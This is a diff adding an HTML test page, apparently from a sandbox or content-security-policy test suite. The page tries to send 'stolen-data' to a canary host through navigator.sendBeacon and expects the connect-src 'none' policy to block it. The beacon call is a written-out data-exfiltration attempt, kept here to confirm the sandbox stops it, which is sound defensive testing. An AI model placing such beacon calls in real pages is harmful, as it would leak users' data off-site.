@@ -1,0 +1,15 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>attack: sendBeacon</title>
+<!-- ATTACK: navigator.sendBeacon, the API purpose-built for exfil-on-unload.
+     Governed by connect-src 'none'. Canary must stay silent. -->
+<script>
+  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const r = { attack: 'sendbeacon' };
+  try {
+    r.returned = navigator.sendBeacon(canary.http + '/beacon', 'stolen-data');
+  } catch (e) {
+    r.threw = String(e);
+  }
+  setTimeout(() => window.bridge.emit('done', r), 800);
+</script>
